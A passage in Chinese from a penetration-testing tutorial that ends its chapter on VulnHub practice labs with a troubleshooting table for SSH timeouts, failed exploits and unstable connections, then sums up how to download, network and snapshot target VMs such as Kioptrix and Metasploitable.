| SSH连接超时 | 靶机未开启SSH | 检查靶机服务状态，或靶机本身问题 |

---

### 【通用】渗透测试问题

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| exploit失败 | 靶机版本不同 | 检查靶机实际版本，选择对应exploit |
| 提权失败 | 漏洞不存在 | 重新信息收集，寻找其他提权方法 |
| 连接丢失 | payload不稳定 | 更换payload，或使用更稳定的连接方式 |

---

## 14.10 本章小结

本章介绍了VulnHub靶场环境的搭建和使用，包括：

1. **靶机下载与导入**：从VulnHub下载靶机，导入VMware/VirtualBox
2. **网络配置**：配置仅主机网络，实现攻击机与靶机互通
3. **经典靶机推荐**：Kioptrix、Metasploitable、DC系列等
4. **渗透测试流程**：信息收集、漏洞分析、利用、提权完整流程
5. **环境管理**：快照管理、目录规划、学习记录

通过本章的学习，您将掌握靶场环境搭建的全流程，为渗透测试学习打下基础。
